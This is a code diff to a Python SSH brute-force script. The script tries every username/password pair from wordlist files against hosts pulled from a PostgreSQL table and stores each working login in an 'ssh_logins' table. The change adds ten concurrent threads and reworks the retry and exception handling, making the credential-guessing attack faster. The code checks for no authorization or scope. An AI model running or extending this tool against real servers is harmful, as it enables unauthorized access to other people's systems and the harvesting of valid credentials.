@@ -27,8 +27,9 @@ conn = psycopg2.connect(
 )
 
 MAX_RETRIES = 3
+THREAD_COUNT = 10
 
-async def ssh_login(username_file, password_file):
+def ssh_login(username_file, password_file):
     with open(username_file, 'r', encoding='utf-8', errors='ignore') as file:
         usernames = file.read().splitlines()
 
@@ -55,41 +56,58 @@ async def ssh_login(username_file, password_file):
                 hostname, ip_address = row
 
                 print(f"{GREEN}Trying {RESET}{username}/{password} {GREEN}as credentials on {RESET}{ip_address}")
-                client.connect(str(ip_address), port=22, username=username, password=password, timeout=15)
-                print(f"{GREEN}Successful login on {RESET}{ip_address}{GREEN} with credentials: {RESET}{username}/{password}")
+
+                try:
+                    client.connect(str(ip_address), port=22, username=username, password=password, timeout=15)
+                    print(f"{GREEN}Successful login on {RESET}{ip_address}{GREEN} with credentials: {RESET}{username}/{password}")
+                except paramiko.AuthenticationException:
+                    # Incorrect credentials, continue to the next one
+                    break
+                except paramiko.SSHException:
+                    print(f"{RED}Failed to connect to {RESET}{ip_address}")
+                    break
+                except socket.timeout:
+                    print(f"{RED}Connection timed out for {RESET}{ip_address}")
+                    break
+                except paramiko.ssh_exception.NoValidConnectionsError as e:
+                    print(f"{RED}Unable to connect to port 22 on {RESET}{ip_address}")
+                    print(f"{RED}Error: {RESET}{str(e)}")
+                    break
+                except (ConnectionResetError, paramiko.ssh_exception.SSHException) as e:
+                    print(f"{RED}Connection reset. Retrying...")
+                    retries += 1
+                    time.sleep(1)  # Wait for 1 second before retrying
+                    continue
+                finally:
+                    client.close()
 
                 cur.execute("INSERT INTO ssh_logins (hostname, ip_address, username, password) VALUES (%s, %s, %s, %s)", (hostname, ip_address, username, password))
                 conn.commit()
                 break
-            except paramiko.AuthenticationException:
-                # Incorrect credentials, continue to the next one
+
+            except Exception as e:
+                print(f"{RED}Error occurred: {RESET}{str(e)}")
+                traceback.print_exc()
                 break
-            except paramiko.SSHException:
-                print(f"{RED}Failed to connect to {RESET}{ip_address}")
-                break
-            except socket.timeout:
-                print(f"{RED}Connection timed out for {RESET}{ip_address}")
-                break
-            except paramiko.ssh_exception.NoValidConnectionsError as e:
-                print(f"{RED}Unable to connect to port 22 on {RESET}{ip_address}")
-                print(f"{RED}Error: {RESET}{str(e)}")
-                break
-            except (ConnectionResetError, paramiko.ssh_exception.SSHException) as e:
-                print(f"{RED}Connection reset. Retrying...")
-                retries += 1
-                time.sleep(1)  # Wait for 1 second before retrying
 
         if retries >= MAX_RETRIES:
             print(f"{YELLOW}Maximum retries reached. Moving to the next host.")
             break
 
-async def run_ssh_login(username_file, password_file):
-    await ssh_login(username_file, password_file)
+def run_ssh_login(username_file, password_file):
+    ssh_login(username_file, password_file)
 
-async def main():
-    while True:
-        await run_ssh_login('usernames.txt', 'passwords.txt')
-        await asyncio.sleep(0.1)
+def main():
+    threads = []
+
+    for _ in range(THREAD_COUNT):
+        thread = threading.Thread(target=run_ssh_login, args=('usernames.txt', 'passwords.txt'))
+        threads.append(thread)
+        thread.start()
+
+    # Wait for all threads to finish
+    for thread in threads:
+        thread.join()
 
 if __name__ == '__main__':
-    asyncio.run(main())
+    main()
